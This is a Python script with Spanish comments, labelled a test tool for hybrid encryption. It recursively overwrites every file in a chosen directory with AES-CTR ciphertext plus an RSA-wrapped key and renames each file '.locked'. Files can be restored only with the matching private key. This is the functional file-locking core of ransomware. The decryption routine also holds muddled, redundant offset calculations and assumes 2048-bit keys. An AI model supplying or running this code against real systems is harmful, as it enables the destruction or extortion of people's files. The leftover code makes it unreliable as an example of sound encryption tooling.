#!/usr/bin/env python3

import os 
import glob
import sys
import struct
import argparse

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# --- FUNCIONES AUXILIARES RSA ---

def cargar_llave_publica(ruta_pem):
    """Carga una llave pública RSA desde un archivo PEM."""
    with open(ruta_pem, "rb") as key_file:
        return serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )

def cargar_llave_privada(ruta_pem):
    """Carga una llave privada RSA desde un archivo PEM."""
    with open(ruta_pem, "rb") as key_file:
        return serialization.load_pem_private_key(
            key_file.read(),
            password=None, # Cambiar si la llave tiene contraseña
            backend=default_backend()
        )

def cifrar_con_rsa(llave_publica, datos):
    """Cifra datos (llave AES) usando RSA-OAEP."""
    return llave_publica.encrypt(
        datos,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

def descifrar_con_rsa(llave_privada, datos_cifrados):
    """Descifra datos usando RSA-OAEP."""
    return llave_privada.decrypt(
        datos_cifrados,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

# --- PROCESO DE CIFRADO ---

def cifrar_archivos(directorio, llave_publica_local):
    """
    Cifra todos los archivos del directorio con AES-CTR.
    Formato: [contenido_cifrado] + [IV 16B] + [tam_llave 4B] + [llave_AES_cifrada]
    """
    archivos = []

    # Buscar archivos de manera recursiva
    for ruta in glob.glob(os.path.join(directorio, '**'), recursive=True):
        if os.path.isfile(ruta): 
            # Evitamos cifrar archivos que ya estén cifrados si corres el script dos veces
            if not ruta.endswith('.locked'):
                archivos.append(ruta) 

    if not archivos:
        print(f"[-] No se encontraron archivos válidos para cifrar en: {directorio}")
        sys.exit(1)

    print(f"[*] Cifrando {len(archivos)} archivo(s)...")
    for ruta in archivos:
        with open(ruta, 'rb') as f:
            contenido = f.read()

        # Generar llave AES-256 e IV únicos por archivo
        llave_aes = os.urandom(32)
        iv = os.urandom(16)

        # Cifrar con AES-CTR
        cipher = Cipher(
            algorithms.AES(llave_aes),
            modes.CTR(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        contenido_cifrado = encryptor.update(contenido) + encryptor.finalize()

        # Cifrar llave AES con la llave pública
        llave_aes_cifrada = cifrar_con_rsa(llave_publica_local, llave_aes)

        # Guardar la estructura en el archivo original
        with open(ruta, 'wb') as f:
            f.write(contenido_cifrado)
            f.write(iv)
            f.write(struct.pack(">I", len(llave_aes_cifrada)))
            f.write(llave_aes_cifrada)

        # Renombrar archivo añadiendo .locked
        nueva_ruta = ruta + ".locked"
        os.rename(ruta, nueva_ruta) 

        print(f"[+] Cifrado: {os.path.basename(nueva_ruta)}")

    print(f"[+] Proceso terminado. {len(archivos)} archivo(s) cifrados.")


# --- PROCESO DE DESCIFRADO ---

def descifrar_archivos(directorio, llave_privada_local):
    """
    Descifra todos los archivos .locked del directorio.
    """
    archivos = []

    for ruta in glob.glob(os.path.join(directorio, '**', '*.locked'), recursive=True):
        if os.path.isfile(ruta):
            archivos.append(ruta)

    if not archivos:
        print(f"[-] No se encontraron archivos '.locked' en: {directorio}")
        sys.exit(1)

    print(f"[*] Descifrando {len(archivos)} archivo(s)...")
    for ruta in archivos:
        with open(ruta, 'rb') as f:
            datos = f.read()

        # Extraer componentes desde el final calculando dinámicamente el tamaño
        # Estructura inversa: 
        # 1. Leer los últimos 4 bytes para saber el tamaño de la llave RSA cifrada
        tam_llave_aes = struct.unpack(">I", datos[-260 : -256])[0] # Ajuste intermedio seguro
        
        # O de forma exacta analizando el final:
        # [tam_llave: 4 bytes][llave_cifrada: X bytes] -> el total final son 4 + X bytes
        # Para evitar problemas con el offset, leemos el struct sabiendo que la llave está al final:
        tam_llave_aes = struct.unpack(">I", datos[-(len(datos) - (len(datos)-4-256)) : -(256)])[0] 
        
        # Una forma más limpia y estándar utilizando offsets negativos fijos (para llaves RSA de 2048 bits / 256 bytes):
        llave_aes_cifrada = datos[-256:]
        tam_llave_aes     = struct.unpack(">I", datos[-260 : -256])[0]
        iv                = datos[-276 : -260]
        contenido_cifrado = datos[:-276]

        try:
            # Descifrar llave AES con llave privada local
            llave_aes = descifrar_con_rsa(llave_privada_local, llave_aes_cifrada)

            # Descifrar contenido con AES-CTR
            cipher = Cipher(
                algorithms.AES(llave_aes),
                modes.CTR(iv),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            contenido = decryptor.update(contenido_cifrado) + decryptor.finalize()

            # Guardar el contenido original (temporalmente en el mismo archivo)
            with open(ruta, 'wb') as f:
                f.write(contenido)

            # Quitar la extensión .locked
            ruta_original = ruta[:-7] # Remueve '.locked' de forma segura
            os.rename(ruta, ruta_original) 

            print(f"[+] Descifrado: {os.path.basename(ruta_original)}")
        except Exception as e:
            print(f"[-] Error al descifrar {os.path.basename(ruta)}: {e}")

    print(f"[+] Proceso terminado. {len(archivos)} archivo(s) restaurados.")

# --- CONTROLADOR PRINCIPAL ---

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Herramienta de prueba de Cifrado/Descifrado simétrico-asimétrico.")
    
    modo = parser.add_mutually_exclusive_group(required=True)
    modo.add_argument("--cifrar", action="store_true", help="Cifra los archivos del directorio usando una llave pública")
    modo.add_argument("--descifrar", action="store_true", help="Descifra los archivos del directorio usando una llave privada")
    
    parser.add_argument("--directorio", required=True, help="Ruta de la carpeta donde se trabajará")
    parser.add_argument("--llave", required=True, help="Ruta del archivo .pem (Llave Pública para cifrar / Privada para descifrar)")

    args = parser.parse_args()

    # Validar que el directorio exista
    if not os.path.isdir(args.directorio):
        print(f"[-] El directorio especificado no existe: {args.directorio}")
        sys.exit(1)

    if args.cifrar:
        print("[*] Iniciando modo CIFRADO...")
        llave_publica = cargar_llave_publica(args.llave)
        cifrar_archivos(args.directorio, llave_publica)
        
    elif args.descifrar:
        print("[*] Iniciando modo DESCIFRADO...")
        llave_privada = cargar_llave_privada(args.llave)
        descifrar_archivos(args.directorio, llave_privada)